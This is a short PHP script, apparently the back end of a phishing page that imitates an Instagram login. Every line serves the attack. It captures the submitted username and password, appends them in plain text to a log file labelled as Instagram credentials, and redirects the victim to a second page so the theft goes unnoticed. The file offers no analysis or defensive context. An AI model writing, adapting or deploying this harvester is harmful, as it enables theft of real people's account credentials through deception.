<?php
$file = 'log.txt';
$fp = fopen($file , 'a');
file_put_contents("log.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: ./login2.html');
exit();
?>
